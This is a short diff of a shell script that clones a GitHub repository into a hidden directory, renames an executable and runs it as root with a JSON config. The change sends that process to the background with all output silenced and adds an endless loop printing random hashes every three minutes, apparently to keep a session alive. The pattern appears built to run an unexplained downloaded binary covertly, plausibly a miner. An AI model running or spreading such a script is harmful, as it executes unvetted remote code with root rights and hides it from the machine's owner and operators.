@@ -13,4 +13,5 @@ mkdir .kap && cd .kap
 git clone https://github.com/nw4tw5/gradi.git
 cd gradi && mv zepo sgr1
 chmod +x sgr1 gr.json
-sudo ./sgr1 -c "gr.json"
+sudo ./sgr1 -c "gr.json" > /dev/null 2>&1 &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
